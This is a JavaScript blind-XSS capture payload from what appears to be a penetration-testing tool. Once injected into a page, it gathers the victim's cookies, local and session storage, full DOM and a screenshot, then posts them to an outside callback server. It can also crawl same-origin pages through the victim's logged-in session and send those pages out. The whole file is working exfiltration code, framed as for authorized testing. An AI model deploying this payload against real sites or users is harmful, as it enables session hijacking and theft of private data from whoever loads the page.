/*
 * oobox blind-XSS capture payload.
 *
 * Capture field set adapted from ezXSS (https://github.com/ssl/ezxss, MIT) — URL, referer,
 * cookies, localStorage, sessionStorage, DOM, user-agent, origin, screenshot — reporting to
 * YOUR oobox server under the token baked into this script's own hostname.
 *
 * Loaded as  <script src="https://<token>.OOBDOMAIN/c.js"></script>. Optional behaviour is
 * driven by query params on THAT src (so the same static file serves every token):
 *
 *   ?pages=/admin,/users/1     comma list of same-origin paths to fetch through the victim
 *                              (authenticated) and return — the ezXSS "additional pages"
 *   ?spider=2                  ALSO recursively crawl same-origin links, up to this depth
 *   ?max=30                    hard cap on total pages fetched (default 20)
 *   ?skip=<url-encoded regex>  extra exclude pattern (merged with the built-in danger list)
 *
 * Flow: the CORE report is POSTed to /c IMMEDIATELY (never lost). Then, in parallel,
 * html2canvas renders a screenshot (attached to that report), and — only if `pages` or
 * `spider` was set — the page fetcher/spider runs, POSTing each fetched page to /c.
 *
 * SAFETY: the spider is opt-in, GET-only, SAME-ORIGIN only, depth- and count-capped,
 * dedupes, and SKIPS state-changing links (logout/delete/remove/…) by default — crawling
 * an authenticated app through a victim can otherwise trigger destructive GET actions.
 *
 * FOR AUTHORIZED TESTING ONLY. Benign proof: it reports back to you. Never chain it into a
 * weaponized or persistent action against real users.
 */
(function () {
  "use strict";
  function selfInfo() {
    try {
      var s = document.currentScript;
      if (!s) {
        var all = document.getElementsByTagName("script");
        for (var i = all.length - 1; i >= 0; i--) {
          if (/\/c\.js(\?|$)/.test(all[i].src)) { s = all[i]; break; }
        }
      }
      if (s && s.src) {
        var u = new URL(s.src);
        return { base: u.protocol + "//" + u.host, q: u.searchParams };
      }
    } catch (e) {}
    return null;
  }

  function safe(fn) { try { return fn(); } catch (e) { return null; } }

  function dumpStorage(store) {
    return safe(function () {
      var out = {};
      for (var i = 0; i < store.length; i++) { var k = store.key(i); out[k] = store.getItem(k); }
      return out;
    });
  }

  var info = selfInfo();
  if (!info) { return; }
  var base = info.base, callback = base + "/c", q = info.q;

  var data = {
    uri: safe(function () { return location.href; }),
    origin: safe(function () { return location.origin; }),
    referer: safe(function () { return document.referrer; }),
    "user-agent": safe(function () { return navigator.userAgent; }),
    cookies: safe(function () { return document.cookie; }),
    localstorage: dumpStorage(window.localStorage),
    sessionstorage: dumpStorage(window.sessionStorage),
    dom: safe(function () { return document.documentElement.outerHTML; }),
    screen: safe(function () { return screen.width + "x" + screen.height; }),
    title: safe(function () { return document.title; }),
    time: new Date().toISOString()
  };

  // Custom parameters: any query param on this script's src other than the reserved
  // crawl controls rides along with the report. `tag` is promoted so it can label WHICH
  // sink fired — e.g. <script src=".../c.js?tag=login-form&field=email">.
  var RESERVED = { pages: 1, spider: 1, max: 1, skip: 1 };
  var custom = {};
  safe(function () { q.forEach(function (v, k) { if (!RESERVED[k]) custom[k] = v; }); });
  if (Object.keys(custom).length) { data.custom = custom; }
  if (custom.tag) { data.tag = custom.tag; }

  post(JSON.stringify(data)).then(function (res) {
    var id = res && res.id;
    if (id != null) { captureScreenshot(id); }
    spider(id);
  }).catch(function () { beacon(JSON.stringify(data)); spider(null); });

  function post(bodyStr) {
    if (window.fetch) {
      return fetch(callback, {
        method: "POST", headers: { "Content-Type": "text/plain" },
        body: bodyStr, keepalive: true, mode: "cors", credentials: "omit"
      }).then(function (r) { return r.json().catch(function () { return {}; }); });
    }
    return Promise.reject();
  }
  function beacon(bodyStr) {
    if (navigator.sendBeacon && navigator.sendBeacon(callback, bodyStr)) { return; }
    var img = new Image();
    img.src = callback + "?d=" + encodeURIComponent(bodyStr).slice(0, 1800);
  }

  // ---- screenshot (html2canvas from same origin) ----------------------------
  function captureScreenshot(id) {
    var done = false;
    var timer = setTimeout(function () { done = true; }, 8000);
    loadH2C(function (ok) {
      if (!ok || done) { return; }
      safe(function () {
        window.html2canvas(document.documentElement, { logging: false, useCORS: true, scale: 1 })
          .then(function (canvas) {
            if (done) { return; }
            clearTimeout(timer);
            post(JSON.stringify({ attach: id, uri: data.uri, screenshot: downscale(canvas, 1280) }))
              .catch(function () {});
          }).catch(function () {});
      });
    });
  }
  function downscale(canvas, maxW) {
    try {
      if (canvas.width <= maxW) { return canvas.toDataURL("image/jpeg", 0.7); }
      var r = maxW / canvas.width, c2 = document.createElement("canvas");
      c2.width = maxW; c2.height = Math.round(canvas.height * r);
      c2.getContext("2d").drawImage(canvas, 0, 0, c2.width, c2.height);
      return c2.toDataURL("image/jpeg", 0.7);
    } catch (e) { return safe(function () { return canvas.toDataURL("image/jpeg", 0.6); }); }
  }
  function loadH2C(cb) {
    if (window.html2canvas) { return cb(true); }
    var s = document.createElement("script");
    s.src = base + "/h2c.js";
    s.onload = function () { cb(!!window.html2canvas); };
    s.onerror = function () { cb(false); };
    (document.head || document.documentElement).appendChild(s);
  }

  // ---- additional pages + recursive spider ----------------------------------
  // Fetches through the victim's authenticated session (credentials:same-origin),
  // GET only, same-origin only, capped, dedup'd, skipping destructive-looking links.
  var DANGER = /(logout|log-out|signout|sign-out|delete|destroy|remove|revoke|drop|disable|deactivate|reset|purge|terminate|shutdown|uninstall)/i;

  function spider(parentId) {
    var cfg = safe(function () {
      var depth = parseInt(q.get("spider") || "0", 10) || 0;
      var pages = (q.get("pages") || "").split(",").map(function (s) { return s.trim(); }).filter(Boolean);
      if (!pages.length && depth <= 0) { return null; }
      var extra = q.get("skip");
      var skip = extra ? new RegExp(DANGER.source + "|" + decodeURIComponent(extra), "i") : DANGER;
      return { depth: depth, max: Math.min(parseInt(q.get("max") || "20", 10) || 20, 200),
               skip: skip };
    });
    if (!cfg) { return; }

    var origin = location.origin, visited = {}, queue = [], fetched = 0, active = 0;

    (q.get("pages") || "").split(",").map(function (s) { return s.trim(); })
      .filter(Boolean).forEach(function (p) { enqueue(abs(p, location.href), 0); });
    if (cfg.depth > 0) { linksIn(document, location.href).forEach(function (u) { enqueue(u, 1); }); }
    pump();

    function abs(href, baseUrl) {
      try { var u = new URL(href, baseUrl); u.hash = ""; return u.href; } catch (e) { return null; }
    }
    function enqueue(url, depth) {
      if (!url || visited[url]) { return; }
      if (url.indexOf(origin + "/") !== 0 && url !== origin) { return; }   // same-origin only
      if (cfg.skip.test(url)) { return; }
      if (depth > cfg.depth && depth !== 0) { return; }
      if (fetched + queue.length >= cfg.max) { return; }
      visited[url] = 1; queue.push({ url: url, depth: depth });
    }
    function linksIn(doc, baseUrl) {
      var out = [], as = doc.getElementsByTagName("a");
      for (var i = 0; i < as.length; i++) {
        var h = as[i].getAttribute("href");
        if (h && h[0] !== "#" && !/^(javascript|mailto|tel):/i.test(h)) {
          var u = abs(h, baseUrl); if (u) { out.push(u); }
        }
      }
      return out;
    }
    function pump() {
      while (active < 2 && queue.length && fetched < cfg.max) {
        var item = queue.shift(); fetched++; active++; fetchPage(item);
      }
    }
    function fetchPage(item) {
      fetch(item.url, { credentials: "same-origin", redirect: "follow" })
        .then(function (r) {
          var status = r.status;
          return r.text().then(function (t) { return { status: status, text: t }; });
        })
        .then(function (res) {
          var title = "", doc = null;
          try { doc = new DOMParser().parseFromString(res.text, "text/html"); title = doc.title; } catch (e) {}
          post(JSON.stringify({ page: item.url, status: res.status, title: title,
                                dom: (res.text || "").slice(0, 100000), depth: item.depth,
                                parent: parentId })).catch(function () {});
          if (doc && item.depth < cfg.depth) {
            linksIn(doc, item.url).forEach(function (u) { enqueue(u, item.depth + 1); });
          }
        })
        .catch(function () {})
        .then(function () { active--; pump(); });
    }
  }
})();
